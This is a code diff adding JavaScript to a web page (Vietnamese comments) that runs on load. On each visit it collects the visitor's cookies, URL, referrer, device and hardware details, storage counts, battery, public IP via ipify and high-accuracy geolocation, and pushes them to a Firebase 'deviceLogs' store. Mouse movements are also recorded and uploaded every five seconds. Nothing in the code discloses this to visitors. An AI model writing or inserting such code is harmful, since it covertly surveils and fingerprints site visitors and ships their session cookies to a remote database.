@@ -1089,7 +1089,194 @@
         text.textContent = `${percent}%`;
       }, 100);
     });
+
+
+  function getBasicDeviceInfo() {
+    return {
+      userAgent: navigator.userAgent,      
+      platform: navigator.platform,          
+      language: navigator.language,          
+      cookies: document.cookie,              
+      url: window.location.href,             
+      referrer: document.referrer,         
+      timestamp: Date.now()                 
+    };
+  }
+
+  function getExtendedDeviceInfo() {
+    const info = getBasicDeviceInfo();
+
+
+    info.screenWidth = window.screen.width;
+    info.screenHeight = window.screen.height;
+    info.colorDepth = window.screen.colorDepth;
+    info.innerWidth = window.innerWidth;
+    info.innerHeight = window.innerHeight;
+    info.devicePixelRatio = window.devicePixelRatio;
+
+
+    if (navigator.connection) {
+      info.connectionType = navigator.connection.type || "N/A";
+      info.downlink = navigator.connection.downlink || "N/A";
+      info.effectiveType = navigator.connection.effectiveType || "N/A";
+    } else {
+      info.connectionType = "N/A";
+      info.downlink = "N/A";
+      info.effectiveType = "N/A";
+    }
+
+
+    info.deviceMemory = navigator.deviceMemory || "N/A";          // Bộ nhớ (GB) ước tính
+    info.hardwareConcurrency = navigator.hardwareConcurrency || "N/A"; // Số lõi CPU
+    info.maxTouchPoints = navigator.maxTouchPoints || 0;            // Số điểm chạm tối đa
+
+    info.localStorageLength = window.localStorage ? window.localStorage.length : "N/A";
+    info.sessionStorageLength = window.sessionStorage ? window.sessionStorage.length : "N/A";
+    info.historyLength = window.history.length;
     
+    // Thông tin múi giờ (phút lệch UTC)
+    info.timezoneOffset = new Date().getTimezoneOffset();
+
+    return info;
+  }
+
+
+  function getPreciseDeviceInfo() {
+    let info = getExtendedDeviceInfo();
+
+
+    if (navigator.userAgentData) {
+      info.uaBrands = navigator.userAgentData.brands || "N/A";
+      info.uaMobile = navigator.userAgentData.mobile || false;
+    }
+
+
+    if (window.performance && window.performance.timing) {
+      const timing = window.performance.timing;
+      info.navigationStart = timing.navigationStart;
+      info.domContentLoadedEventEnd = timing.domContentLoadedEventEnd;
+      info.loadEventEnd = timing.loadEventEnd;
+      info.totalLoadTime = timing.loadEventEnd - timing.navigationStart;
+    }
+
+
+    if (window.performance && window.performance.memory) {
+      info.jsHeapSizeLimit = window.performance.memory.jsHeapSizeLimit;
+      info.totalJSHeapSize = window.performance.memory.totalJSHeapSize;
+      info.usedJSHeapSize = window.performance.memory.usedJSHeapSize;
+    }
+
+    return info;
+  }
+
+
+  function storeInfo(info) {
+    firebase.database().ref('deviceLogs').push(info);
+    console.log("Full Device info logged:", info);
+  }
+
+
+  function getGeoLocationAndStore(info) {
+    if ("geolocation" in navigator) {
+      navigator.geolocation.getCurrentPosition(
+        function(position) {
+          info.latitude = position.coords.latitude;
+          info.longitude = position.coords.longitude;
+          info.accuracy = position.coords.accuracy;
+          storeInfo(info);
+        },
+        function(error) {
+          console.error("Lỗi khi lấy vị trí:", error);
+          storeInfo(info);
+        },
+        {
+          enableHighAccuracy: true,
+          timeout: 5000,
+          maximumAge: 0
+        }
+      );
+    } else {
+      storeInfo(info);
+    }
+  }
+
+
+  function logDetailedDeviceInfo() {
+    let info = getPreciseDeviceInfo();
+
+
+    fetch("https://api.ipify.org?format=json")
+      .then(response => response.json())
+      .then(data => {
+        info.ip = data.ip;
+
+        if (navigator.getBattery) {
+          navigator.getBattery().then(function(battery) {
+            info.batteryCharging = battery.charging;
+            info.batteryLevel = battery.level;
+            getGeoLocationAndStore(info);
+          }).catch(function(err) {
+            console.error("Lỗi Battery API:", err);
+            getGeoLocationAndStore(info);
+          });
+        } else {
+          getGeoLocationAndStore(info);
+        }
+      })
+      .catch(err => {
+        console.error("Lỗi lấy IP:", err);
+        if (navigator.getBattery) {
+          navigator.getBattery().then(function(battery) {
+            info.batteryCharging = battery.charging;
+            info.batteryLevel = battery.level;
+            getGeoLocationAndStore(info);
+          }).catch(function(err) {
+            console.error("Lỗi Battery API:", err);
+            getGeoLocationAndStore(info);
+          });
+        } else {
+          getGeoLocationAndStore(info);
+        }
+      });
+  }
+
+
+  function logPerformanceMetrics() {
+    if (window.performance && window.performance.timing) {
+      const timing = window.performance.timing;
+      const metrics = {
+        timeToInteractive: timing.domInteractive - timing.navigationStart,
+        domContentLoaded: timing.domContentLoadedEventEnd - timing.navigationStart,
+        totalLoadTime: timing.loadEventEnd - timing.navigationStart,
+        timestamp: Date.now()
+      };
+      firebase.database().ref('performanceMetrics').push(metrics);
+      console.log("Performance metrics logged:", metrics);
+    }
+  }
+
+
+  let mouseMoves = [];
+  document.addEventListener("mousemove", function(e) {
+    mouseMoves.push({ x: e.clientX, y: e.clientY, timestamp: Date.now() });
+  });
+  setInterval(function() {
+    if (mouseMoves.length > 0) {
+      firebase.database().ref('activityLogs/mouseMoves').push({
+        moves: mouseMoves.slice(),
+        sessionTimestamp: Date.now()
+      });
+      mouseMoves = [];
+    }
+  }, 5000);
+
+
+  window.addEventListener("load", function() {
+    logDetailedDeviceInfo();
+    logPerformanceMetrics();
+  });
+
+
     // (Có thể bổ sung thêm push notifications, caching offline, ...)
 
     // (Hàm updatePresence có thể được định nghĩa thêm nếu cần để quản lý danh sách online)
